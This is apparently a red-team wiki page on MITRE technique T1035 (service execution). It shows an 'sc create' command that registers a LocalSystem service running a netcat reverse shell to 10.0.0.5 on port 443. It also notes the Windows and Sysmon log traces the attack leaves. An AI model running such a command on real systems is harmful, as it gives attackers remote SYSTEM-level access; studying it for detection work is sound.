---
description: 'Code Execution, Privilege Escalation'
tags: [#privilege-escalation, #code-execution]
---

# Service Execution

## Execution

Creating an evil service with a netcat reverse shell:

```csharp
// attacker@victim
C:\> sc create evilsvc binpath= "c:\tools\nc 10.0.0.5 443 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""
[SC] CreateService SUCCESS
C:\> sc start evilsvc
```

## Observations

The reverse shell lives under services.exe as expected:

![[services-nc.png]]

Windows security, application, Service Control Manager and sysmon logs provide some juicy details:

![[services-logs.png]]

![[services-shell.png]]

## References

[attack.mitre.org/wiki/Technique/T1035](https://attack.mitre.org/wiki/Technique/T1035)

